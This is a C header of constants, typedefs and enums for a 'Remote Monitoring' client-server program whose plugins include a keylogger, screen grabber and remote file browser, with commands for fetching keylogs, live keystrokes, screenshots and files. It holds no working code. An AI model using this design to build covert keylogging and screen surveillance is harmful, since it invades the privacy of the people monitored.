
// ** Remote Monitoring **

// RMDefs.h
// Consists of all the typedefs, enums and #defines

// ** #defines **

// * Server Side *
// Max String Lengths
#define MAX_NICK_NAME		32		// Maximum length of nickname of a client machine
#define MAX_TIMENODE_NAME	12
#define MAX_SW_MSG			256		// status window message
#define MAX_SB_MSG			128		// status bar message
#define MAX_SEARCH_STR		128
#define SB_NPARTS			3		// number of parts in status bar
#define IPADDR_LEN			15
#define MAX_RADIO_BTN_NAME	32
#define MAX_PLUGIN_ID_TEXT	8

// MAX
#define MAX_CLIENTS			20

// File Paths
#define FP_SERVER_CONF				L"Server.conf"
#define FP_SERVER_LOGFILE			L"ServerRM.log"
#define FP_SERVER_PLUGIN_DLL_DIR	L"PluginDLLs"
#define FP_PLUGINS_DB				L"Plugins.dat"
#define FP_CLIENTS_DB				L"Clients.dat"
#define FP_CLIENTS_DIR				L"Clients"
#define FP_CLIENT_CONF				L"ClientInfo.conf"
#define FP_CLIENT_PLUGINS_DIR		L"Plugins"
#define FP_CLIENT_KLM_DIR			L"Plugins\\KLM"
#define FP_CLIENT_KLM_CONF			L"Plugins\\KLM\\KLConfig.conf"
#define FP_CLIENT_LOGFILES_DIR		L"Plugins\\KLM\\LogFiles"
#define FP_CLIENT_SGM_DIR			L"Plugins\\SGM"
#define FP_CLIENT_SGM_CONF			L"Plugins\\SGM\\SGConfig.conf"
#define FP_CLIENT_SHOTS_DIR			L"Plugins\\SGM\\SnapShots"
#define FP_CLIENT_RT_SHOTS_DIR		L"Plugins\\SGM\\RealTimeShots"
#define FP_CLIENT_FBM_DIR			L"Plugins\\FBM"
#define FP_TEMP_DIR					L"Temp"

#define ASHOT_TEXT	L"Application Shot"
#define MSHOT_TEXT	L"Mouse Shot"
#define FSHOT_TEXT	L"Fullscreen Shot"

// Event Object Names
#define EVENT_FT_COMPLETE		L"FTCompleteEvent"
#define EVENT_FT_READY			L"FTReadyEvent"
#define EVENT_WRITE_READY		L"SocketWriteReady"
#define EVENT_IF_DATA_READY		L"IFDataReadyEvent"
#define EVENT_PING_INFO_READY	L"PingInfoReadyEvent"
#define EVENT_IP_SCAN_COMPLETE	L"IPScanCompleteEvent"


// * Client Side *
// Max String Lengths
#define MAX_KLIF_KEYS		5000	// Keys[] buffer size in the KLIF
#define MAX_KL_KEYS			500
#define MAX_FILES			128		// Maximum number of files and directories under a directory
#define MAX_FILE_NAME		32
#define MAX_CLASS_NAME		32
#define MAX_WND_TITLE		64
#define MAX_WND_LIST		12
#define MAX_KEY_NAME		12
#define MAX_KEYS_DT_INIT	( MAX_KL_KEYS * 5 / 4 )
#define MAX_KEYS_WRITE_INIT ( MAX_KLIF_KEYS * 10 / 9 )	// To store data to be written into the log file

// File Paths
#define FP_HOST_CONF		L"Client.conf"
#define FP_CLIENT_LOGFILE	L"ClientRM.log"
#define	FP_PLUGINS_DIR		L"Plugins"
#define	FP_KL_DIR			L"Plugins\\KL"
#define	FP_KLDLL_DIR		L"Plugins\\KL\\Install"
#define	FP_LOGFILES_DIR		L"Plugins\\KL\\LogFiles"
#define	FP_SG_DIR			L"Plugins\\SG"
#define	FP_SGDLL_DIR		L"Plugins\\SG\\Install"
#define FP_SG_SHOTS_DIR		L"Plugins\\SG\\SnapShots"
#define FP_SG_RT_SHOTS_DIR	L"Plugins\\SG\\RealTimeShots"
#define FP_FB_DIR			L"Plugins\\FB"
#define FP_FBDLL_DIR		L"Plugins\\FB\\Install"
#define	FP_TEMP_DIR			L"Temp"

// Name of function exported by the plugin interfaces
#define DLL_IF_PROCESS		"ProcessCmd"

// Class Names and Window Titles
#define KLIF_WND_CLASS_NAME		L"KeyLogIF"
#define KLIF_WND_TITLE			L"KeyLogIF"
#define CLIENT_RM_WINDOW_TITLE	L"ClientRM"
#define CLIENT_RM_CLASS_NAME	L"ClientRM"


// * Common *
#define COM_PORT				22074	// communication port
#define FTP_PORT				22075	// FileTransfer port
#define SEND_BUFSIZE			2048
#define RECV_BUFSIZE			2048
#define FT_BUFSIZE				4096
#define RM_SOF					"SOF"
#define RM_FNF					"FNF"
#define RM_EOF					"EOF"

#define CUSTOM_STACK_SIZE		12582912L	// 12MB

#define CHANGE_TO_MS_FROM_MIN(x) ( x * 60 * 1000 )
#define CHANGE_TO_MS_FROM_SEC(x) ( x * 1000 )

#define CHANGE_TO_MIN_FROM_MS(x) (((x / 1000) / 60 ))
#define CHANGE_TO_SEC_FROM_MS(x) (x / 1000)

#define MAX_PLUGINS				5
#define MAX_APPS				15
#define MAX_LOCAL_FILE_PATHS	20

// Max String Lengths
#define MAX_PATH_NAME			32
#define MAX_HOST_NAME			255
#define MAX_PROGRESS_MSG		64
#define MAX_LOGFILE_LINE		512
#define MAX_PLUGIN_ID			8


// ** typedefs **
typedef int RM_COMMAND;		// Any command used between any module
typedef int FTYPE;			// File type
typedef int PTYPE;			// Plugin type
typedef int CLI_RESPONSE;	// Responses sent by the CPM back to the server side modules
typedef int PACKET_TYPE;	// type of structure passed between server and client during File Transfer


// ** enumerations **

enum PLUGIN_ID
{

	KEYLOGGER = 1,
	SCREENGRABBER,	
	FILEBROWSER,	
	ADMINGUI		

};

enum SHOT_TYPE
{

	ApplicationShot = 20,
	MouseShot,
	FullscreenShot

};

enum PACKETTYPE
{
	COMMAND = 30,	// packet contains only command
	NOTIFICATION,	// packet contains only notifications
	PM_DATA,		// packet contains command and data from plugin manager

	FILE_DATA,		// indicates that FILECONTENTS::szData contains file data
	FILE_MARKER,	// indicates that FILECONTENTS::szdata contains SOF/EOF markers or ACK
	FILE_CHECKSUM	// indicates that FILECONTENTS::szdata contains checksum of the transfered file
};

enum COMMAND
{

	SCM_STARTSESSION = 100,
	SCM_INIT_FT,
	SCM_FILEREADY,
	SCM_EOF,
	SCM_SENDDATA,
	SCM_FWDDATA_TO_SPM,
	SCM_STOPSESSION,
	
	SPM_STARTSESSION,
	SPM_STOPSESSION,
	SPM_SENDDATA,
	SPM_FWD_DATA,
	SPM_CLIENT_CONF,
	SPM_PING_CLIENT,
	SPM_HELLO,
	SPM_FT_START,			
	SPM_FT_TERM,
	
	CCM_INIT_MODULE,
	CCM_STARTSESSION,
	CCM_STOPSESSION,
	CCM_SENDDATA,
	CCM_FWDDATA_TO_CPM,
	CCM_DOWNLOAD,
	CCM_INIT_FT,
	CCM_SEND_NOTIFICATION,
	
	CPM_INSTALL,
	CPM_REMOVE, 
	CPM_QUERY,
	CPM_START,
	CPM_STOP,
	CPM_SENDDATA,
	CPM_FWD_DATA,
	CPM_HELLO,

	IF_INIT_PLUGIN,
	IF_TERM_PLUGIN,
	IF_CMD_PLUGIN,
	IF_GET_PDATA,

	KLIF_GET_LOGFILES,
	KLIF_RT_START,
	KLIF_RT_STOP,
	KLIF_UPDATE_CONFIG,

	KL_TEMP_LINKLIST_DATA,

	SGIF_GET_SHOTS,
	SGIF_RT_START,
	SGIF_RT_STOP,
	SGIF_UPDATE_CONFIG,

	FBIF_GETDRIVES,
	FBIF_EXPAND,
	FBIF_LIST_FILES,
	FBIF_FCOPY,

	// These are sent from server to 
	// client for file transfer operation.
	FT_INIT,
	FT_START,
	FT_SEND_CHECKSUM
};

// Client Response Messages meant for the 
// Plugin Monitors on the Server Side.
enum CLIENT_RESPONSE
{
	KLM_LOGFILES = 200,
	KLM_RT_KEYS,

	SGM_SHOTS,
	SGM_RT_SHOT,

	FBM_DRIVES,
	FBM_DIRS,
	FBM_FILES
};

enum NOTIFICATION
{
	
	SCMN_CONNECTED = 300,
	SCMN_DISCONNECTED,
	SCMN_DATA_IN,
	SCMN_FT_READY,
	
	SPMN_CONNECTED,			// notifies SPM that connection to remote machine has been established
	SPMN_DISCONNECTED,		// notifies SPM that connection to remote machine has been terminated
	SPMN_DATA_IN,
	SPMN_FT_SUCCESS,

	CCMN_DATA_IN,
	CCMN_FT_READY,

	CPMN_DATA_IN			// sent by CCM to CPM to notify CPM that data has been received from server

};

// File Transfer Complete Status
enum FT_COMPLETE_STATUS
{
	FT_ERROR_SUCCESS_NO_DELETE = 450,
	FT_ERROR_SUCCESS_DELETE,
	FT_ERROR_FILE_CORRUPTED,
	FT_ERROR_FNF,
	FT_ERROR_OPEN_DEST_FILE,
	FT_ERROR_WRITE_TO_FILE,
	FT_ERROR_READ_FROM_FILE,
	FT_ERROR_CONN_FAIL,
	FT_ERROR_CONN_CLOSED
};

// Custom Error Codes
enum ERROR_CODE
{

	// server side
	E_CONNFAIL = 500,
	E_CREATE_DIR,

	// client side
	E_FILE_CREATION,
	E_FILE_WRITE,
	E_FILE_READ,

	E_CCM

};

enum WM_WN_MESSAGES
{
	WM_SESSION_START = (WM_USER+1),
	WM_SESSION_STOP,
	WM_SOCKET_NOTIFY,
	//WM_EXE_INIT,
	WM_SEND_DATA,		// lParam points to SCMData to be sent
	WM_SEND_ACK,
	WM_START_SCAN_RESULTS,
	WM_START_EDIT_NICKNAME,

	WM_FT_SOCKET_NOTIFY,
	WM_FT_START,
	WM_FT_SEND_FILE,
	WM_FT_SEND_CHECKSUM,
	WM_FT_INIT,
	WM_FT_TERM,
	WM_FT_SET_COMPLETE_EVENT,
	WM_FT_SEND_ACK,

	WM_CLIENT_RESPONSE,		// sent to the plugin monitors by the SPM
	WM_CHILD_DLG_ACTIVATE,
	WM_CHILD_DLG_DEACTIVATE,
	WM_CHILD_DLG_CLOSE,
	WN_DLG_NOTIFICATION,	// wParam = WN_DLG_DISCONNECTED
	WN_DLG_DISCONNECTED,


	// ClientRM specific WN
	WN_INIT_DONE
};